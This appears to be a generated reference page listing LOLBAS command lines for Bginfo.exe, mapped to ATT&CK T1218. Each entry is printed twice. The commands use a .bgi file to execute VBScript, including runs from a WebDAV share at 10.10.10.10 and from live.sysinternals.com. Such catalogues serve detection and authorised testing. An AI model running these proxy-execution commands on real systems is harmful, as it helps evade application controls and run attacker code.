---
parsed_by: focuslocust
source: commands
type: generated
---
# Bginfo Commands

[Home](../../../README.md)

> This page contains security testing commands. Use only in authorised environments.

## Bginfo.exe

Tool page: [Bginfo.exe](../../tools/windows/bginfo.exe.md)

### Local execution of VBScript

```text
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

Description:

Execute VBscript code that is referenced within the specified .bgi file.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |

### Local execution of VBScript

```text
bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

Description:

Execute VBscript code that is referenced within the specified .bgi file.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |

### Remote execution of VBScript

```text
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

Description:

Execute bginfo.exe from a WebDAV server.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |

### Remote execution of VBScript

```text
\\10.10.10.10\webdav\bginfo.exe {PATH:.bgi} /popup /nolicprompt
```

Description:

Execute bginfo.exe from a WebDAV server.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |

### Remote execution of VBScript

```text
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

Description:

This style of execution may not longer work due to patch.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |

### Remote execution of VBScript

```text
\\live.sysinternals.com\Tools\bginfo.exe {PATH_SMB:.bgi} /popup /nolicprompt
```

Description:

This style of execution may not longer work due to patch.

Related ATT&CK:

- [T1218](../../attack/techniques/T1218-system-binary-proxy-execution.md)

Provenance:

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Bginfo.yml` |
| Evidence | Command preserved from source parser. |
